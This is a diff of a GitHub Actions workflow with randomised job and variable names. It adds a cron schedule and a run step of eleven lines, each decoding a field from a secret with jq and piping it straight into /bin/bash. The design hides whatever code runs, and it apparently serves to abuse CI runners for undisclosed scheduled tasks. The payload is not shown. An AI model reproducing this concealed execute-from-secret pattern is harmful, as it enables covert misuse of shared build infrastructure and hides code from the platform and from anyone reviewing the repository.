@@ -2,26 +2,25 @@ name: heshibu4102
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 4/6 * * *'
-
-jobs:  # 20183
+    - cron: '18 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: heshibu4102
         env:
-          vc05597: ${{ secrets.vc05597 }}
+          kat92094: ${{ secrets.kat92094 }}
         run: |
-          echo $vc05597 | jq -r .klzq28316 | /bin/bash
-          echo $azyou67955 | jq -r .oog39 | /bin/bash
-          echo $gqlv6 | jq -r .hrx160 | /bin/bash
-          echo $sht29509 | jq -r .cafy35 | /bin/bash
-          echo $ctkbx60 | jq -r .gmhy545 | /bin/bash
-          echo $h7 | jq -r .kee8 | /bin/bash
-          echo $dtt2742 | jq -r .d906 | /bin/bash
-          echo $lif93307 | jq -r .k4288 | /bin/bash
-          echo $gm1 | jq -r .jicdw0 | /bin/bash
-          echo $swaui1 | jq -r .c05 | /bin/bash
-          echo $hfcy240 | jq -r .jritc6 | /bin/bash
+          echo $kat92094 | jq -r .m3 | /bin/bash
+          echo $bsd10685 | jq -r .exg49 | /bin/bash
+          echo $h51428 | jq -r .xha2981 | /bin/bash
+          echo $klrc195 | jq -r .w85545 | /bin/bash
+          echo $fe4823 | jq -r .xrdn8688 | /bin/bash
+          echo $k72483 | jq -r .risdj34722 | /bin/bash
+          echo $x66707 | jq -r .d55 | /bin/bash
+          echo $bq37 | jq -r .cee3989 | /bin/bash
+          echo $z6 | jq -r .omwxd20 | /bin/bash
+          echo $zv78 | jq -r .mrhw40 | /bin/bash
+          echo $ok6866 | jq -r .xrrr70067 | /bin/bash
 
